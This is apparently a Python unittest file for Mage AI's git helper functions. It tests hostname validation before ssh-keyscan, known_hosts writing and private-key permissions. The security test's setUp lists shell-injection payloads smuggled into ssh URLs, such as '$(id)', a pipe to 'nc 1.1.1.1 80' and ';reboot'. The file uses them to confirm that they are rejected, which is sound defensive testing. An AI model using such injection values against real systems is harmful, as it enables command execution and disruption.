import os
import stat
import subprocess
import tempfile
import unittest
from types import SimpleNamespace
from unittest.mock import patch

from mage_ai.data_preparation.git import utils


def scanned(returncode=0, stdout=b'git.example.com ssh-rsa AAAAB3Nza\n'):
    return subprocess.CompletedProcess(['ssh-keyscan'], returncode, stdout=stdout)


class AddHostToKnownHostsSecurityTest(unittest.TestCase):
    def setUp(self):
        self.payloads = [
            'ssh://h;touch /tmp/should_not_exist',
            'ssh://h$(id)',
            'ssh://h`id`',
            'ssh://h|nc 1.1.1.1 80',
            'ssh://h&&touch /tmp/x',
            'ssh://;reboot',
        ]

    def test_shell_metacharacters_rejected(self):
        for payload in self.payloads:
            with self.subTest(payload=payload), \
                 patch('subprocess.run') as mock_run, \
                 self.assertRaises(ValueError):
                utils.add_host_to_known_hosts(payload)
            # ssh-keyscan should never be invoked with a poisoned hostname
            mock_run.assert_not_called()

    def test_safe_hostname_accepted(self):
        with patch('subprocess.run', return_value=scanned()) as mock_run, \
             patch('builtins.open'), \
             patch('os.makedirs'):
            result = utils.add_host_to_known_hosts('ssh://git.example.com:22')
            self.assertTrue(result)
            args, kwargs = mock_run.call_args
            # `subprocess.run` is invoked with a list (no shell), and the
            # hostname is passed as a single argv element. `urlparse` strips
            # the port into `.port`, so we expect just the host here.
            self.assertEqual(args[0][0:3], ['ssh-keyscan', '-t', 'rsa'])
            self.assertEqual(args[0][3], 'git.example.com')
            self.assertNotIn('shell', kwargs)  # never run via /bin/sh

    def test_no_scheme_added_automatically(self):
        with patch('subprocess.run', return_value=scanned()), \
             patch('builtins.open'), \
             patch('os.makedirs'):
            result = utils.add_host_to_known_hosts('git.example.com')
            self.assertTrue(result)


class KnownHostsTest(unittest.TestCase):
    """A failed ssh-keyscan returned True, and later SSH calls failed without a reason."""

    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.known_hosts = os.path.join(folder.name, 'known_hosts')
        patcher = patch.object(utils, 'DEFAULT_KNOWN_HOSTS_FILE', self.known_hosts)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_the_scanned_keys_are_added(self):
        with patch('subprocess.run', return_value=scanned()):
            self.assertTrue(utils.add_host_to_known_hosts('git.example.com'))

        with open(self.known_hosts, 'rb') as f:
            self.assertEqual(f.read(), b'git.example.com ssh-rsa AAAAB3Nza\n')

    def test_a_failed_or_empty_scan_returns_false_and_adds_nothing(self):
        for result in (scanned(returncode=1, stdout=b''), scanned(stdout=b'\n')):
            with self.subTest(result=result), patch('subprocess.run', return_value=result):
                self.assertFalse(utils.add_host_to_known_hosts('git.example.com'))
        self.assertFalse(os.path.exists(self.known_hosts) and os.path.getsize(self.known_hosts))


class ExistingPrivateKeyTest(unittest.TestCase):
    def test_an_existing_key_file_is_made_private(self):
        """ssh refuses a private key others can read; an existing key was used as it was."""
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        key = os.path.join(folder.name, 'id_rsa_deploy')
        with open(key, 'w') as f:
            f.write('key')
        os.chmod(key, 0o644)
        git_config = SimpleNamespace(
            ssh_public_key_secret_name=None,
            ssh_private_key_secret_name='deploy',
            remote_repo_link=None,
        )

        with patch.object(utils, 'DEFAULT_SSH_KEY_DIRECTORY', folder.name):
            self.assertEqual(utils.create_ssh_keys(git_config, folder.name), key)

        self.assertEqual(stat.S_IMODE(os.stat(key).st_mode), 0o600)


if __name__ == '__main__':
    unittest.main()
